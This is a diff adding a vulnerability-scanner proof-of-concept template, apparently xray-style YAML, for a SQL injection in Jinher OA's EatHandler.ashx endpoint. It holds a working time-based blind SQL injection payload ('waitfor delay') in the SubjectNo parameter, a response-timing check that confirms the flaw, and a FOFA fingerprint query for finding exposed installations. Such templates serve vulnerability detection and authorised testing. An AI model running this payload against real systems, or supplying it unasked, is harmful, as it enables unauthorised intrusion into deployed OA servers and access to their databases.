@@ -1,0 +1,26 @@
+id: poc-yaml-jinher-jhsoft-eathandler-ashx-sqli
+info:
+  name: 金和OA EatHandler.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /c6/JHSoft.Web.CostU8/EAI/EatHandler.ashx?SubjectNo=1'waitfor+delay%270:0:{{.t1}}%27--&State=code
+  expression: 'status_code == 200 &&
+
+    contains(content_type,"application/json") &&
+
+    body == "[]" &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
